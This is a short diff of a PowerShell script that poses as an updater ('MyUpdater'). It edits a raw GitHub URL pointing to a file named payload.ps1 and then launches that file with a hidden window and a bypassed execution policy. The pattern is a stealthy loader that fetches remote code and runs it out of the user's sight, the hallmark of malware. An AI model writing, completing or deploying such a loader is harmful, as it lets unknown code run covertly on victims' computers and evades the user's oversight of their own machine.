@@ -1,4 +1,4 @@
-$repoUrl = "https://raw.githubusercontent.com/discosoupy/update/main/payload.ps1"
+$repoUrl = "https://raw.githubusercontent.com/discosoupy/update/refs/heads/main/payload.ps1"
 $localFolder = "$env:LOCALAPPDATA\MyUpdater"
 $payloadPath = "$localFolder\payload.ps1"
 
@@ -16,3 +16,4 @@ catch {}
 if (Test-Path $payloadPath) {
     Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
 }
+
